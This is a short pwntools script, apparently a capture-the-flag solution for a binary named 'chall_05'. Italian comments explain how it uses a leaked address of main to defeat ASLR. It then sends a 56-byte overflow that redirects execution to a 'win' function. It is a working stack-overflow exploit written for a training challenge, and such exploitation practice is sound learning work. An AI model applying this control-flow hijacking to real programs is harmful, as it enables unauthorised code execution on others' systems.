#!/bin/python3
from pwn import *

p = process("./chall_05")
p_elf = ELF("./chall_05")

p.sendline()

p.recvuntil("Yes I\'m going to win: ")
main_addr = int(p.recvline(),16)

"""
Calcoliamo il base code address:

Dato l'indirizzo di una qualsiasi funzione, la sua lontananza dall'indirizzo
di base è costante!

Quindi basta fare 
(Indirizzo di base) = (Indirizzo con ASLR) - (Indirizzo senza ASLR)

assegnando ad p_elf.address l'indirizzo di base, tutti gli indirizzi in p_elf.symbol
si adatteranno al nuovo indirizzo di partenza!

"""

p_elf.address = main_addr - p_elf.sym["main"]

#56 = padding, siccome l'array è di 56 char e visto che char = 1 byte
payload = b"A"*56 + p64(p_elf.sym["win"]) 
p.sendline(payload)

p.interactive()